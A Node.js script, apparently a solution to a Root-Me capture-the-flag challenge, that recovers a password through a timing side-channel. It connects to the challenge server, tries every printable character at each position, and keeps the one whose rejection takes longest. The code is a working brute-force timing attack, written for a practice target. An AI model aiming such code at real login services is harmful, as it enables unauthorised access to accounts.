var host = 'challenge01.root-me.org';
var port = 51015;
var net = require('net');
var socket = net.createConnection(port, host);

var keys = [];
for(var c = 32; c < 126; c++) {
    keys.push(String.fromCharCode(c));
}

var lastTime = 0;
var pass = '';
var key = 0;
var last_key = 0;
var last_time = 10;
var tour = 0;

socket.on('data', function(data) {
    var response = data.toString().trim();
    if (/(Enter|Wrong key)/.test(response)) {
        var diff = (new Date()).getTime() - lastTime;
		if (diff > last_time)
		{
			last_time = diff;
			last_key = key;
		}
            key++;
		if (key > 93){
			tour++;
            		pass += ''+keys[last_key + 1];
			key = 0;
			last_time = 10;
			last_key = 0;
			if (tour >= 12){
	            		console.log(pass);
				pass = '';
				tour = 0;
			}
		}
        setTimeout(function() {
            lastTime = (new Date()).getTime();
            var t = pass+keys[key];
			if (diff >= last_time)
			{
            			//console.log(t, + ' ' + diff);
			}
		else
		{
	            //console.log(t);
		}
            socket.write(t+'\r\n');
        }, 250);
    } else {
        console.log('Guess is ', pass+keys[key]);
    }
}).on('connect', function() {
    console.log('=connected');
    lastTime = (new Date()).getTime();
}).on('end', function() {
    console.log('=end');
});
